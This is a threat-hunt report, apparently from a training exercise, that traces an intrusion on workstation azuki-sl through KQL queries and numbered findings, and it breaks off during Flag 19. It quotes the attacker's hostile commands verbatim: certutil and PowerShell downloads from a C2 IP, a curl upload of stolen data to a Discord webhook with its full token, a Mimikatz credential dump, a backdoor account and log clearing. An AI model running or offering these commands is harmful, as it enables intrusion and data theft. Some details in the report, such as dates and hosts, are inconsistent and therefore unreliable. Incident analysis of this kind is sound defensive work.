#  Threat Hunt Report: Azuki Import/Export

Analyst: Andres Torres Richardson

Date Completed: 2025-10-25

Environment Investigated: AZUKI-SL (IT admin workstation)

Timeframe: November, 2025

## Executive Summary

In the month of Novermber 2025 , Azuki Import/Export Trading Co has been targetted by a financially motivated threat actor targeting import/export companies. The adversary established Initial Access, Weaponization with Delivery, Persistence with Evade Detection, and while connecting to a C2 server to achieve their objectives. Each flag represents a key stage of the attack chain, culminating in attempts to cover tracks and exit the environment undetected.

## Timeline

| **Time (UTC)**           | **Flag** | **Action Observed**                          | **Key Evidence**                                        |
| ------------------------ | -------- | -------------------------------------------- | ------------------------------------------------------- |
| **2025-11-18T22:44:11Z** | Flag 1   | Initial Remote Access via RDP                | Inbound Remote IP 88.97.178.12                          |
| **2025-11-18T22:44:11Z** | Flag 2   | Compromised User Account                     | `kenji.sato`                                            |
| **2025-11-19T01:04:05Z** | Flag 3   | Enumerating network topology                 | `ARP.EXE -a` Command Executed                           |
| **2025-11-19T18:49:27Z** | Flag 6   | Folder Excluded for Evasion                  | `C:\Users\KENJI~1.SAT\AppData\Local\Temp`               |
| **2025-11-19T18:49:29Z** | Flag 5   | File Extension Excluding for Evasion         | RegistryValueName's `.bat, .ps1, .exe` Excluded         |
| **2025-11-19T18:49:48Z** | Flag 18  | Malicious Script Method                      | `wupdate.ps1` Downloaded Externally for Execution       |
| **2025-11-19T19:05:33Z** | Flag 4   | Malware Staging Directory Created            | `C:\ProgramData\WindowsCache`                           |
| **2025-11-19T19:07:21Z** | Flag 7   | Download Binary Abuse                        | `certutil.exe` for Fetching Downloads                   |
| **2025-11-19T19:07:22Z** | Flag 12  | Credential Dumping Tool Usage                | `mm.exe`                                                |
| **2025-11-19T19:07:46Z** | Flag 8   | Persistence As Scheduled Task                | schtask.exe /create /tn `Windows Update Check`          |
| **2025-11-19T19:07:46Z** | Flag 9   | Scheduled Task Folder Path Creation          | `C:\ProgramData\WindowsCache\svchost.exe`               |
| **2025-11-19T19:08:26Z** | Flag 13  | Type of Memory Extraction Module             | Mimikatz sekurlsa logonpasswords module                 |
| **2025-11-19T19:08:58Z** | Flag 14  | Data Staging Archive `export-data.zip`       | Compressed Company Data                                 |
| **2025-11-19T19:09:21Z** | Flag 15  | File Upload to Cloud Services                | 443 port connectivity to `discord.com`                  |
| **2025-11-19T19:09:48Z** | Flag 17  | Creation Of Hidden Account                   | Account With Elevated Rights called `support`           |
| **2025-11-19T19:10:37Z** | Flag 19  | Targeted IP for Lateral Movement             | `cmdkey.exe" /list` followed by `cmdkey.exe /generic:10.1.0.188 /user:fileadmin /pass:**********` |
| **2025-11-19T19:10:41Z** | Flag 20  | Tool for Lateral Movement                    | `mstsc.exe /V:` Used for RDP Connectivity to 10.1.0.188 |
| **2025-11-19T19:11:04Z** | Flag 10  | Connection to C2 Server                      | Remote IP `78.141.196.6`                                |
| **2025-11-19T19:11:04Z** | Flag 11  | Port Connectivity to C2 Server               | HTTPS / 443                                             |
| **2025-11-19T19:11:39Z** | Flag 16  | Log clearing via `wevtutil`                  | Cleared Security, System, and App logs by `cl` command  |



---
### Starting Point – Identifying the Initial System

**Objective:**
Determine where initial access was obtained to validate the incident timeline. 


Considering intelligence related to the “JADE SPIDER” threat actor, the typical dwell time ranges from approximately 21 to 45 days, with the most recent observed activity reported in November. <br/>
Based on this, the investigation window was set from 45 days prior through the current date.<br/>
Endpoint Device in question that has been compromised is "azuki-sl".<br/>
I will filter for interactive Logontype which will indicate a public remote IP connection.<br/>

**Host of Interest (Starting Point):** `azuki-sl`  
**Why:** Admin Account has desired data useful for adversary.<br/>
**KQL Query Used:**
```
DeviceLogonEvents
| where AccountDomain contains "azuki-sl"
| where TimeGenerated between (datetime(2025-10-09T00:00:00.0000000Z) .. datetime(2025-11-22T23:00:00.0000000Z))
| where DeviceName contains "azuki-sl"
| where LogonType contains "Interactive"
| where isnotempty(RemoteIP)
| sort by TimeGenerated desc
```

<img width="1151" height="359" alt="1st" src="https://github.com/user-attachments/assets/3169d930-d582-4941-b071-b28bcc6701e7" />
The user account kenji.sato on device azuki-sl shows remote access activity from IP address 159.26.106.98.<br/> 
Let’s query specifically for the earliest instance where this account established a remote session from any external source.<br/> 
After all it's the AccountNames (not necessarily the domain) that are compromised first for the initial entry source.<br/> 

**KQL Query Used:**
```
DeviceLogonEvents
| where TimeGenerated between (datetime(2025-10-09T00:00:00.00Z) .. datetime(2025-11-22T23:00:00.00Z))
| where AccountName contains "kenji.sato"
| where LogonType contains "Interactive"
| where isnotempty(RemoteIP)
| where RemoteIPType contains "Public"
| sort by TimeGenerated desc

```
<img width="1128" height="495" alt="2nd" src="https://github.com/user-attachments/assets/478978cf-38f4-43dd-b732-af0d1f581318" />

Logs show a TimeGenerated frame between 11/18/2025 and 11/22/2025<br/>
(2025-11-18T22:44:11.6770861Z - 2025-11-22T00:27:58.4166424Z)
This will now be the new timeframe to query moving forward.<br/>

Here I see all the different Devices the user kenji.sato has accessed. "azuki-sl", "azuki-kslog", "azuki-logks", "azuki-wks01", "azuki-logistics"<br/>
First log that shows signs of a suspicious RemoteIP accessing this account via RDP due to its LogonType being "RemoteInteractive" is 88.97.178.12 with Timestamp of 2025-11-18T22:44:11.6770861Z


---

## Flag-by-Flag Findings

---

🚩 **Flag 1 – INITIAL ACCESS - Remote Access Source** <br/>
🎯 **Objective:** Determine initial access from any external connections.<br/>
:brain: **Thought Process:** Refer to "Starting Point" section<br/>
📌 **Finding (answer):** **88.97.178.12**  
🔍 **Evidence:**
- **Host:** "azuki-logistics"  
- **Timestamp:** 2025-11-18T22:44:11.6770861Z  
- **Process:** Interactive external RDP connection<br/>
💡 **Why it matters:** Origin helps with threat actor attribution and can block ongoing attacks.<br/>

**KQL Query Used:**
```
DeviceLogonEvents
| where TimeGenerated between (datetime(2025-10-09T00:00:00.00Z) .. datetime(2025-11-22T23:00:00.00Z))
| where AccountName contains "kenji.sato"
| where LogonType contains "Interactive"
| where isnotempty(RemoteIP)
| where RemoteIPType contains "Public"
| sort by TimeGenerated desc

```
<img width="1128" height="495" alt="2nd" src="https://github.com/user-attachments/assets/b39d6820-8a7c-455c-ae73-eb4a4909cdc6" />



---

🚩 **Flag 2 – INITIAL ACCESS - Compromised User Account**  
🎯 **Objective:** Identify which account credentials were compromised.<br/>
:brain: **Thought Process:** Refer to "Starting Point" section.<br/>
📌 **Finding (answer):** `kenji.sato`  
🔍 **Evidence:**  
- **Host:** "azuki-logistics"
- **Timestamp:** 2025-11-18T22:44:11.6770861Z
-  **LogonType:** RemoteInteractive<br/>
💡 **Why it matters:** Reveals which account within the Domain has been the victim to brute-force or a phishing attack.<br/>

**KQL Query Used:**
```
DeviceLogonEvents
| where AccountDomain contains "azuki-sl"
| where TimeGenerated between (datetime(2025-10-09T00:00:00.0000000Z) .. datetime(2025-11-22T23:00:00.0000000Z))
| where DeviceName contains "azuki-sl"
| where LogonType contains "Interactive"
| where isnotempty(RemoteIP)
| sort by TimeGenerated desc

```

---

🚩 **Flag 3 – DISCOVERY - Network Reconnaissance**  
🎯 **Objective:** Identify any signs of enumerating network topology.  
:brain: **Thought Process:** It's common for threat actor to proceed with enumerating network topology once they have gained initial access to identify lateral movement opportunities.
Threat actors will utilize powershell.exe or cmd.exe to execute network specific commands and arguements.
Query will be tailored towards InitiatingProcessCommandLine for anything containing powershell.exe or cmd.exe.
Projecting ProcessCommandLine to see the syntax threat actor used.
I looked at the earliest dates to investigate any suspicious network topology commands.<br/>
📌 **Finding (answer):** `"ARP.EXE" -a`  
🔍 **Evidence:**  
- **Host:** "azuki-logistics"  
- **Timestamp:** 2025-11-19T01:04:05.73442Z 
- **Process:** powershell.exe  
- **CommandLine:** `"ARP.EXE" -a`<br/>
💡 **Why it matters:**  Identifies intention for lateral movement opportunities and high-value targets.<br/>

**KQL Query Used:**
```
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-11-18T22:00:00.00Z) .. datetime(2025-11-22T23:00:00.00Z))
| where AccountName contains "kenji.sato"
| where InitiatingProcessCommandLine has_any ("powershell", "cmd")
| sort by TimeGenerated desc
| project TimeGenerated, AccountDomain, AccountName, ActionType, ProcessCommandLine

```

<img width="1202" height="613" alt="3rd" src="https://github.com/user-attachments/assets/4581cd3b-45a5-4a4c-ac1c-c1f22fc27a79" />



---

🚩 **Flag 4 – DEFENCE EVASION - Malware Staging Directory**  
🎯 **Objective:**  Identify the primary malware directory.<br/> 
:brain: **Thought Process:** I will now look to see for a staging directory by looking for specific processcommandline commands in which contain any "+h" or "+s" which creates a directory hidden from view. This would be a threat actors choice to evade detection. I will include all devicename's in question that's been likely compromised.
Query shows a folder called WindowsCache with a path of: C:\ProgramData\WindowsCache using both the +h and +s arguments
While there's multiple suspicious staging directories detected across multiple devices, the one in particular with ProcessRemoteSessionIP being from an external source (192.168.1.45) indicates it was the Primary staging directory before threat actor performed internal lateral movement onto other devices.<br/>
📌 **Finding (answer):** `C:\ProgramData\WindowsCache`  
🔍 **Evidence:**  
- **Host:** "azuki-sl"  
- **Timestamp:** 2025-11-19T19:05:33.7665036Z 
- **Process:** `"attrib.exe" +h +s C:\ProgramData\WindowsCache`<br/>
💡 **Why it matters:** It reveal's the scope of compromise and helps locate additional malicious artefacts.<br/>

**KQL Query Used:**
```
DeviceProcessEvents
| where Timestamp between (datetime(2025-11-18T22:00:00.00Z) .. datetime(2025-11-22T23:00:00.00Z))
| where DeviceName has_any ("azuki-sl", "azuki-kslog", "azuki-logks", "azuki-wks01", "azuki-logistics")
| where ActionType == "ProcessCreated"
| where ProcessCommandLine has_any ("+h", "+s")
| project Timestamp, AccountDomain, AccountName, DeviceName, FileName, FolderPath, ProcessCommandLine, ProcessRemoteSessionIP, ProcessRemoteSessionDeviceName
| sort by Timestamp desc

```
<img width="1138" height="659" alt="Flag4" src="https://github.com/user-attachments/assets/41ee5c2b-9836-46bb-bf45-5ce9596885d0" />


---

🚩 **Flag 5 – DEFENCE EVASION - File Extension Exclusions**<br/>
🎯 **Objective:** Look for any possible Window Defender file extension exclusions and count them.<br/> 
:brain: **Thought Process:** Looking into Windows Registry Keys for any modifications to Windows Defender under all the compromised Device names. I notice 3 Exclusions being set.<br/>
📌 **Finding (answer):** 3  
🔍 **Evidence:**  
- **Host:** "azuki-sl"  
- **Timestamps:** 2025-11-19T18:49:27.7301011Z - 2025-11-19T18:49:29.1787135Z  
- **Process:** Windows Resistry
- **ActionType:** RegistryValueSet
- **RegistryValueName's:** `.bat,  .ps1, .exe`  <br/>
💡 **Why it matters:** These exclusions reveals the scope of the attacker's defense evasion strategy.<br/>

**KQL Query Used:**
```
DeviceRegistryEvents
| where TimeGenerated between (datetime(2025-11-01T00:30:11.6770861Z) .. datetime(2025-11-22T23:00:00.00Z))
| where DeviceName has_any ("azuki-sl", "azuki-kslog", "azuki-logks", "azuki-wks01", "azuki-logistics")
| where RegistryKey contains "Windows Defender\\Exclusions\\Extensions"
| project TimeGenerated, ActionType, DeviceName, RegistryValueName, InitiatingProcessCommandLine
| order by TimeGenerated desc

```
<img width="997" height="275" alt="Flag5" src="https://github.com/user-attachments/assets/83a80da3-1410-4461-adb9-57106ef0c4ab" />


---

🚩 **Flag 6 – DEFENCE EVASION - Temporary Folder Exclusion**  
🎯 **Objective:** Find folder path exclusions to Windows Defender to prevent scanning of directories.<br/> 
:brain: **Thought Process:** Continuing to look into Registry keys associated with windows defender I will now gear towards specific folders in which possibly have been modified to be undetected/ignored. Such registry key is under Windows Defender\\Exclusions\\Paths. It is known for temp folders to be taken advantage by threat actors. We know its "azuki-sl" for our targeted device. Looking specifically at "azuki-sl' logs we see the temp folder.<br/>
📌 **Finding (answer):** `C:\Users\KENJI~1.SAT\AppData\Local\Temp`  
🔍 **Evidence:**  
- **Host:** "azuki-sl"  
- **Timestamp:** 2025-11-19T18:49:27.6830204Z  
- **RegistryKey:** `Windows Defender\\Exclusions\\Paths`  
- **RegistryValueName:** `C:\Users\KENJI~1.SAT\AppData\Local\Temp`  <br/>
💡 **Why it matters:** These exclusions allow malware to run undetected.<br/>

**KQL Query Used:**
```
DeviceRegistryEvents
| where TimeGenerated between (datetime(2025-11-01T00:30:11.6770861Z) .. datetime(2025-11-22T23:00:00.00Z))
| where DeviceName has_any ("azuki-sl", "azuki-kslog", "azuki-logks", "azuki-wks01", "azuki-logistics")
| where RegistryKey contains "Windows Defender\\Exclusions\\Paths"
| project TimeGenerated, ActionType, DeviceName, InitiatingProcessFolderPath, RegistryKey, RegistryValueName, InitiatingProcessCommandLine
| order by TimeGenerated desc

```
<img width="1236" height="541" alt="Flag6" src="https://github.com/user-attachments/assets/ae1d664f-5b24-42ee-a001-31b3c0987f9d" />


---

🚩 **Flag 7 – DEFENCE EVASION - Download Utility Abuse**  
🎯 **Objective:** Identify legitimate system utilities used to download malware.<br/> 
:brain: **Thought Process:** With the suspicious initiatingremotesessionIP being 192.168.1.45 consistently being associated with previous logs findings, it goes to show this is actually the IP doing all the current malicious actions but wasn't necessarily the 
IP with Initial access. 
This IP will be included into the query to filter results. Domain azuki-sl is in question so I will be keeping that as our Device Name. 
I projected minimally and useful information to look through for any windows native tools that could have been used to download malware to avoid detection. 
We know Invoke-Webrequest is very common and not the stealthiest command but its considered.
I'm presented with 42 logs in which I will look through the ProcessCommandLine's for any IP/URL/URI 's 
"certutil.exe" looks to have been used to download externally.
I noticed also curl.exe being used but doesn't show it was used to download anything externally. 
<br/>
📌 **Finding (answer):** `certutil.exe`<br/>
🔍 **Evidence:**  
- **Host:** "azuki-sl"  
- **Timestamps:** 2025-11-19T19:07:21.0804181Z  
- **Process:** "certutil.exe"  
- **CommandLines:**  
  - `"certutil.exe" -urlcache -f http://78.141.196.6:8080/svchost.exe C:\ProgramData\WindowsCache\svchost.exe`  
  - `"certutil.exe" -urlcache -f http://78.141.196.6:8080/AdobeGC.exe C:\ProgramData\WindowsCache\mm.exe`  
- **Initiating:** powershell.exe  <br/>
💡 **Why it matters:** comsvcs.dll MiniDump likely targeted LSASS; output masked as HR config to blend with business activity. <br/>

**KQL Query Used:**
```
DeviceProcessEvents
| where Timestamp between (datetime(2025-11-18T22:00:00.00Z) .. datetime(2025-11-22T23:00:00.00Z))
| where DeviceName has_any ("azuki-sl")
| where InitiatingProcessRemoteSessionIP has_any ("192.168.1.45")
| where ActionType == "ProcessCreated"
| project Timestamp, DeviceName, ActionType, FileName, ProcessCommandLine
| sort by Timestamp desc

```
<img width="1124" height="645" alt="Flag7" src="https://github.com/user-attachments/assets/33210209-377a-40d8-8b09-7964822f2802" />


---

🚩 **Flag 8 – PERSISTENCE - Scheduled Task Name**  
🎯 **Objective:**  Identify the name of the scheduled task created for persistence. <br/>
:brain: **Thought Process:** Lets look to see for any possible persistence in scheduled tasks before looking into Run keys. 
schtasks.exe with \create parameter is used in processcommandline for such creations so we will filter using that.
Only 3 such logs were identified under the same azuki-sl and 192.168.1.45 IP.
We notice a suspicious "Windows Update Check" has been created and added into scheduled tasks during the compromise time frame and the process creation is associated with the malicious IP.<br/>
📌 **Finding (answer):** `Windows Update Check`  
🔍 **Evidence:** 
- **Host:** "azuki-sl"  
- **Timestamp:** 2025-11-19T19:07:46.9796512Z  
- **Process:** schtasks.exe (initiated by powershell.exe)
- **CommandLine:**  
  - `"schtasks.exe" /create /tn "Windows Update Check" /tr C:\ProgramData\WindowsCache\svchost.exe /sc daily /st 02:00 /ru SYSTEM /f` <br/>
💡 **Why it matters:** Scheduled tasks provide reliable persistence across system reboots.<br/>

**KQL Query Used:**
```
 DeviceProcessEvents
| where Timestamp between (datetime(2025-11-18T22:00:00.00Z) .. datetime(2025-11-22T23:00:00.00Z))
| where DeviceName has_any ("azuki-sl")
| where InitiatingProcessRemoteSessionIP has_any ("192.168.1.45")
| where ProcessCommandLine has_any ("schtasks.exe", "\\create")
| sort by Timestamp desc

```
<img width="1133" height="633" alt="Flag8" src="https://github.com/user-attachments/assets/1beb5e9b-f1a9-443e-a986-0d27b576c3da" />


---

🚩 **Flag 9 – PERSISTENCE - Scheduled Task Target**<br/>
🎯 **Objective:** Identify the executable path configured in the scheduled task.<br/>  
:brain: **Thought Process:** Using the same query used in Flag 8 and looking at the ProcessCommandLine the "/tr C:\ProgramData\WindowsCache\svchost.exe" is what defines the executable path.<br/>
📌 **Finding (answer):** `C:\ProgramData\WindowsCache\svchost.exe`<br/>
🔍 **Evidence:**  
- **Host:** "azuki-sl"  
- **Timestamp:** 2025-11-19T19:07:46.9796512Z
- **CommandLine:**  
  - `"schtasks.exe" /create /tn "Windows Update Check" /tr C:\ProgramData\WindowsCache\svchost.exe /sc daily /st 02:00 /ru SYSTEM /f` <br/>
💡 **Why it matters:** This scheduled task path defines what executes at runtime. This reveals the exact persistence mechanism and the malware location.<br/>

**KQL Query Used:**
```
 DeviceProcessEvents
| where Timestamp between (datetime(2025-11-18T22:00:00.00Z) .. datetime(2025-11-22T23:00:00.00Z))
| where DeviceName has_any ("azuki-sl")
| where InitiatingProcessRemoteSessionIP has_any ("192.168.1.45")
| where ProcessCommandLine has_any ("schtasks.exe", "\\create")
| sort by Timestamp desc

```

---

🚩 **Flag 10 – COMMAND & CONTROL - C2 Server Address**  
🎯 **Objective:** Identify the IP address of the command and control server. <br/>
:brain: **Thought Process:** Looking to see for any outbound connections after malware was installed. This malware assist in accomplishing such connections. These connections indicate a possible C2 server.
I will include the malware location as the initiatingProcessFolderPath. 
The only IP initiated from the malware location is 78.141.196.6.<br/>
📌 **Finding (answer):** Unusual outbound connection → **78.141.196.6**  
🔍 **Evidence:**  
- **Host:** "azuki-sl" | **ActionType:** "ConnectionSuccess"  
- **Timestamp:** 2025-11-19T19:11:04.1766386Z <br/>
💡 **Why it matters:** Identifying C2 servers enables network blocking and infrastructure tracking. <br/>

**KQL Query Used:**
```
DeviceNetworkEvents
| where Timestamp between (datetime(2025-11-18T22:00:00.00Z) .. datetime(2025-11-22T23:00:00.00Z))
| where InitiatingProcessFolderPath contains "C:\\ProgramData\\WindowsCache\\svchost.exe"

```

<img width="1086" height="637" alt="Flag10" src="https://github.com/user-attachments/assets/3659fb48-af93-40d4-bc06-7d1e4f04e098" />



---

🚩 **Flag 11 – COMMAND & CONTROL - C2 Communication Port**  
🎯 **Objective:** Identify the destination port used for command and control communications.<br/> 
:brain: **Thought Process:** Looking at the same log in Flag 10 we are shown the port the C2 IP is utilizing.<br/>
📌 **Finding (answer):** Port 443   
🔍 **Evidence:**  
- **Host:** "azuki-sl"  
- **Timestamp:** 2025-11-19T19:11:04.1766386Z
- **RemoteIP:** 78.141.196.6
- **InitiatingProcessRemoteSessionIP:** 192.168.1.45<br/>
💡 **Why it matters:** This information supports network detection rules and threat intelligence correlation..<br/>

**KQL Query Used:**
```
DeviceNetworkEvents
| where Timestamp between (datetime(2025-11-18T22:00:00.00Z) .. datetime(2025-11-22T23:00:00.00Z))
| where InitiatingProcessFolderPath contains "C:\\ProgramData\\WindowsCache\\svchost.exe"
| project Timestamp, DeviceName, ActionType, RemoteIP, RemotePort, LocalIP, Protocol, RemoteIPType, InitiatingProcessParentFileName, InitiatingProcessRemoteSessionDeviceName, InitiatingProcessRemoteSessionIP

```
<img width="1133" height="634" alt="Flag10" src="https://github.com/user-attachments/assets/c09f2478-a116-47ce-8734-7990d5035038" />


---

🚩 **Flag 12 – CREDENTIAL ACCESS - Credential Theft Tool**  
🎯 **Objective:** Identify the filename of the credential dumping tool. <br/> 
:brain: **Thought Process:** Looking for credential dumping tools I will now pivot into DeviceFileEvents. 
Such tools would be placed into the malware location we found previously in C:\\ProgramData\\WindowsCache.
Query will be filtered with folderpath correlating to that location. 
I'm shown a download externally from http://78.141.196.6:8080/AdobeGC.exe and put into C:\ProgramData\WindowsCache and named ass "mm.exe".<br/>
📌 **Finding (answer):** `mm.exe`  
🔍 **Evidence:**  
- **Host:** "azuki-sl"
- **ActionType:** "FileCreated"
- **InitiatingProcessFileName:** "certitil.exe"
- **InitiatingProcessCommandLine:** `"certutil.exe" -urlcache -f http://78.141.196.6:8080/AdobeGC.exe C:\ProgramData\WindowsCache\mm.exe`<br/>
💡 **Why it matters:** Identifies exactly the filename and location to prevent the pivot point of a simple contained compromise to a full environment takeover. <br/>

**KQL Query Used:**
```
DeviceFileEvents
| where DeviceName == "azuki-sl"
| where Timestamp between (datetime(2025-11-18T22:00:00.00Z) .. datetime(2025-11-22T23:00:00.00Z)) 
| where FolderPath startswith "C:\\ProgramData\\WindowsCache"
| sort by Timestamp desc
| project Timestamp, DeviceName, ActionType, FileName, FolderPath, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessRemoteSessionIP

```

<img width="1134" height="630" alt="Flag12" src="https://github.com/user-attachments/assets/fa563fc4-0206-4ee1-bd5e-3166090de5d7" />



---

🚩 **Flag 13 – CREDENTIAL ACCESS - Memory Extraction Module**  
🎯 **Objective:**  Identify the module used to extract logon passwords from memory.<br/>
:brain: **Thought Process:** I will now look to see for any executions made from this "mm.exe".
Any logs indicating any process events from such malware will indicate what the tool was used for exactly. 
In DeviceProcessEvents I will include the FileName "mm.exe".
Only 1 log is shown and processcommandline shows sekurlsa::logonpasswords is executed. 
This is a module and command is a memory extraction module.<br/>
📌 **Finding (answer):** `sekurlsa::logonpasswords` <br/>
🔍 **Evidence:**  
- **Host:** "azuki-sl" 
- **Timestamp:** 2025-11-19T19:08:26.2804285Z
- **FileName:** `mm.exe`
- **ProcessVersionInfoOriginalFileName:** "mimikatz.exe"
- **ProcessCommandLine:** `"mm.exe" privilege::debug sekurlsa::logonpasswords exit`<br/>
💡 **Why it matters:**  Documenting the exact technique used with credential theft tools aids in detection engineering.<br/>

**KQL Query Used:**
```
DeviceProcessEvents
| where Timestamp between (datetime(2025-11-18T22:00:00.00Z) .. datetime(2025-11-22T23:00:00.00Z))
| where DeviceName has_any ("azuki-sl")
| where FileName contains "mm.exe

```
<img width="842" height="431" alt="Flag13" src="https://github.com/user-attachments/assets/7fae08c6-cd0d-466b-bdd1-c4e1a520419c" />

---

🚩 **Flag 14 – COLLECTION - Data Staging Archive**  
🎯 **Objective:** Identify the compressed archive filename used for data exfiltration.<br/>
:brain: **Thought Process:** Considering this credential dumping tool was downloaded and the threat actor executed memory extraction to obtain usernames and passwords. I will now be looking for this stolen collected data which is usually compressed and located in same malware folder. I will specifically look for any zip files after the creation and execution of mm.exe.<br/>
📌 **Finding (answer):** `export-data.zip`<br/>
🔍 **Evidence:**  <br/>
- **Host:** "azuki-sl"
- **TimeStamp:** 2025-11-19T19:08:58.0244963Z
- **ActionType:** "FileCreated"
- **FolderPath:** `C:\ProgramData\WindowsCache\export-data.zip` <br/>
💡 **Why it matters:** The archive filename often includes dates or descriptive names for the attacker's organisation.<br/>

**KQL Query Used:**
```
DeviceFileEvents
| where DeviceName == "azuki-sl"
| where Timestamp between (datetime(2025-11-18T22:00:00.00Z) .. datetime(2025-11-22T23:00:00.00Z)) 
| where FolderPath startswith "C:\\ProgramData\\WindowsCache"
| sort by Timestamp desc

```
<img width="1115" height="626" alt="Flag14" src="https://github.com/user-attachments/assets/c11d82df-0e97-42e5-844c-d732bbf40de2" />


---

🚩 **Flag 15 – EXFILTRATION - Exfiltration Channel**  
🎯 **Objective:** Identify the cloud service used to exfiltrate stolen data.  
:brain: **Thought Process:** DeviceNetworkEvents will provide us details to see what IP or URL the data export.zip file was exported to.
We know mm.exe was created at this time stamp: 2025-11-19T19:07:22.8551193Z
We also know the last malicious log event is at: 2025-11-22T23:00:00.00Z.<br/>

Data export had to have been after the creation of mm.exe so that will be our beginning timestamp. 
Targeting 443 & 80 port due to a common exfiltration technique is using cloud web services. This will be our remoteport filter. 
The data file in question that will be exported we know is "export-data.zip"
This file would be called for to initiate a upload so I will filter for InitiatingProcessCommandLine to include any syntax of "export-data".
What I'm shown is the suspicious RemoteIP connection with its RemoteURL.<br/>
📌 **Finding (answer):** `discord`  
🔍 **Evidence:**  
- **Timestamp:** 2025-11-19T19:09:21.4234133Z
- **Host:** "azuki-sl" · **ActionType:** "ConnectionSuccess" 
- **RemoteUrl:** "discord.com" | **RemotePort:** 443
- **InitiatingProcessCommandLine:** `"curl.exe" -F file=@C:\ProgramData\WindowsCache\export-data.zip https://discord.com/api/webhooks/1432247266151891004/Exd_b9386RVgXOgYSMFHpmvP22jpRJrMNaBqymQy8fh98gcsD6Yamn6EIf_kpdpq83_8`<br/>
💡 **Why it matters:** Identifying the service helps with incident scope determination and potential data recovery.<br/>

**KQL Query Used:**
```
DeviceNetworkEvents
| where DeviceName == "azuki-sl"
| where Timestamp between (datetime(2025-11-19T19:07:22.8551193Z) .. datetime(2025-11-22T23:00:00.00Z))
| where RemotePort in (80, 443)
| where isnotempty(RemoteUrl)
| where InitiatingProcessCommandLine contains "export-data"
| sort by Timestamp desc
| project Timestamp, RemoteUrl, DeviceName, ActionType, RemoteIP, RemotePort, InitiatingProcessCommandLine

```
<img width="1134" height="607" alt="Flag15" src="https://github.com/user-attachments/assets/81029a58-2d3f-4bb0-bd0b-ac70e7bc16b3" />

---


🚩 **Flag 16 – ANTI-FORENSICS - Log Tampering**  
🎯 **Objective:** Identify the first Windows event log cleared by the attacker. <br/> 
:brain: **Thought Process:** Log clearing being a common defensive evading technique, I used this query and looked through all 31 results for any "cl" arguments. Only 3 out of those logs which were at the bottom of the list in desc order actually had the "cl" command along with "wevtutil".<br/>
📌 **Finding (answer):** `Security`  
🔍 **Evidence:**  
- **Host:** "azuki-sl"
- **Timestamp:** 2025-11-19T19:11:39.0934399Z
- **ActionType:** "ProcessCreated" | **FileName:** "wetutil.exe"
- **ProcessCommandLine:** `"wetutil.exe" cl Security`<br/>
💡 **Why it matters:** The order of log clearing can indicate attacker priorities and sophistication.<br/>

**KQL Query Used:**
```
DeviceProcessEvents
| where DeviceName == "azuki-sl"
| where Timestamp between (datetime(2025-11-18T22:00:00.00Z) .. datetime(2025-11-22T23:00:00.00Z))
| where isnotempty(ProcessCommandLine)
| where ProcessCommandLine contains "wevtutil"
| project Timestamp, ProcessCommandLine
| sort by Timestamp desc 

```
<img width="1135" height="650" alt="Flag16" src="https://github.com/user-attachments/assets/df4c7726-6764-49de-9dc5-377156c0e97e" />


---

🚩 **Flag 17 – IMPACT - Persistence Account**  
🎯 **Objective:** Identify the backdoor account username created by the attacker. <br/> 
:brain: **Thought Process:** Looking to see if there's any persistence with account creations. I will focus on the processcommandline for any "/add" and the initiatingProcessFileName being "powershell" since this threat actor shows consistent use of making his actions through powershell.<br/>
📌 **Finding (answer):** `support`  
🔍 **Evidence:**  
- **Host:** "azuki-sl"
- **Timestamp:** 2025-11-19T19:09:48.8977132Z
- **ActionType:** "ProcessCreated" | **FileName:** "net.exe"
- **ProcessCommandLine:** `"net.exe" user support ********** /add`<br/>
💡 **Why it matters:** These hidden admin-level accounts provide the adversay alternative access to future operations.<br/>

**KQL Query Used:**
```
DeviceProcessEvents
| where DeviceName == "azuki-sl"
| where Timestamp between (datetime(2025-11-18T22:00:00.00Z) .. datetime(2025-11-22T23:00:00.00Z))
| where ProcessCommandLine contains "/add"
| where InitiatingProcessFileName == "powershell.exe"
| sort by Timestamp desc 
 

```
<img width="1125" height="618" alt="Flag17" src="https://github.com/user-attachments/assets/71c1e4f5-1fe5-47dd-8436-7b4bf9307f5d" />


---

🚩 **Flag 18 – EXECUTION - Malicious Script**  
🎯 **Objective:** Identify the PowerShell script file used to automate the attack chain.<br/>
:brain: **Thought Process:** When looking for any malicious scripts to automate their attack chain, this usually consist of fetching external scripts. 
I will search in DeviceFileEvents for the initiatingprocesscommandline that consist of Invoke-WebRequest and consist of any .bat, .ps1, .py files.
Looking through the 19 results the first detected logs consist of a Invoke-WebRequest downloaded a wupdate.ps1 file.<br/>
📌 **Finding (answer):** `wupdate.ps1`  
🔍 **Evidence:**  
- **Host:** "azuki-sl"
- **Timestamp:** 2025-11-19T18:49:48.7079818Z
- **ActionType:** "FileCreated" | **FileName:** "wupdate.ps1"
- **InitiatingProcessCommandLine:** `powershell  -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'http://78.141.196.6:8080/wupdate.ps1' -OutFile 'C:\Users\KENJI~1.SAT\AppData\Local\Temp\wupdate.ps1' -UseBasicParsing"`<br/>
💡 **Why it matters:** Identifying the initial attack script reveals the entry point and automation method used in the compromise.<br/>

**KQL Query Used:**
```
DeviceFileEvents
| where DeviceName == "azuki-sl"
| where Timestamp between (datetime(2025-11-18T22:00:00.00Z) .. datetime(2025-11-22T23:00:00.00Z))
| where ActionType == "FileCreated"
| where InitiatingProcessFileName == "powershell.exe"
| where InitiatingProcessCommandLine has_any (".bat", ".ps1", ".py", "Invoke-WebRequest")
| where InitiatingProcessRemoteSessionIP == "192.168.1.45"
| sort by Timestamp desc
| project Timestamp, DeviceName, ActionType, FileName, FolderPath, InitiatingProcessCommandLine, InitiatingProcessRemoteSessionDeviceName, InitiatingProcessRemoteSessionIP

```
<img width="1132" height="651" alt="Flag18" src="https://github.com/user-attachments/assets/85cab871-e929-4c25-978c-17241321610a" />



---

🚩 **Flag 19 – LATERAL MOVEMENT - Secondary Target**<br/>
🎯 **Objective:** Identify the IP address targeted for lateral movement.<br/>  
:brain: **Thought Process:** Any indicators of mstsc.exe or cmdkey.exe utilization by this threat actor will show signs of lateral movement intent.  
I will filter any processevents in the command line for any mstsc or cmdkey. 
`"cmdkey.exe" /list` executed first then followed by... cmdkey execution targeting 10.1.0.188. Threat actor sets a generic key and sets username and password.<br/>
📌 **Finding (answer):** 10.1.0.188 <br/>
🔍 **Evidence:**  
- **Host:** "azuki-sl"
- **Timestamp:** 2025-11-19T19:10:37.2625077Z
- **ActionType:** "ProcessCreated" | **FileName:** "cmdkey.exe" 
- **ProcessCommandLine's:**
